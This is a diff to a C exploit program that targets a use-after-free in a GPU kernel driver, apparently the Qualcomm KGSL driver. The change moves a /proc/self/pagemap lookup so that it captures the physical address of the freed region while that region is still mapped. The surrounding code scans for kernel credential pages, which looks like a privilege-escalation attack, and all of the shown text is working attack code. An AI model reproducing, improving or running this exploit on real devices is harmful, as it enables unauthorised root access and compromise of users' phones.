@@ -343,6 +343,24 @@ int main(int argc, char **argv) {
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
     if (uaf_m == MAP_FAILED) die("mmap UAF");
+
+    // Get PFN of UAF_ADDR while it's mapped
+    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
+    if (pagemap_fd < 0) die("open pagemap");
+    uint64_t pagemap_entry;
+    off_t off = (UAF_ADDR / 0x1000) * 8;
+    if (lseek(pagemap_fd, off, SEEK_SET) != off || read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) != sizeof(pagemap_entry)) {
+        die("read pagemap for UAF");
+    }
+    if (!(pagemap_entry & 0x8000000000000000ULL)) {
+        printf("[-] UAF_ADDR not present in pagemap\n");
+        return 1;
+    }
+    uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
+    uint64_t uaf_base_pa = pfn << 12;
+    close(pagemap_fd);
+    printf("[*] UAF base physical address = 0x%lx\n", (unsigned long)uaf_base_pa);
+
     munmap(uaf_m, UAF_SIZE);
 
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
@@ -459,25 +477,6 @@ int main(int argc, char **argv) {
     uint64_t dst_ga = 0, dst_flags = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
 
-    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
-    if (pagemap_fd < 0) die("open pagemap");
-
-    uint64_t pagemap_entry;
-    off_t off = (OVERLAP_ADDR / 0x1000) * 8;
-    if (lseek(pagemap_fd, off, SEEK_SET) != off || read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) != sizeof(pagemap_entry)) {
-        die("read pagemap for overlap");
-    }
-    if (!(pagemap_entry & 0x8000000000000000ULL)) {
-        printf("[-] OVERLAP_ADDR not present in pagemap\n");
-        return 1;
-    }
-    uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
-    uint64_t pa_overlap = pfn << 12;
-    uint64_t uaf_base_pa = pa_overlap - (OVERLAP_ADDR - UAF_ADDR);
-    uint32_t phys_offset = (uint32_t)(kernel_base & 0xFFFFFFFFULL);
-    printf("[*] UAF base physical address = 0x%lx\n", (unsigned long)uaf_base_pa);
-    printf("[*] phys_offset = 0x%x\n", phys_offset);
-
     uint64_t scan_start = UAF_ADDR + 0x1000;
     uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
     uint64_t cred_pages[32];
@@ -489,6 +488,8 @@ int main(int argc, char **argv) {
     uint32_t *cmd;
     int dw;
     unsigned int ts;
+
+    uint32_t phys_offset = (uint32_t)(kernel_base & 0xFFFFFFFFULL); // assume lower 32 bits are physical address offset
 
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
@@ -548,7 +549,6 @@ int main(int argc, char **argv) {
             }
         }
     }
-    close(pagemap_fd);
     printf("\n[*] Phase 7 complete: found %d cred pages\n", n_cred);
 
     if (n_cred == 0) {
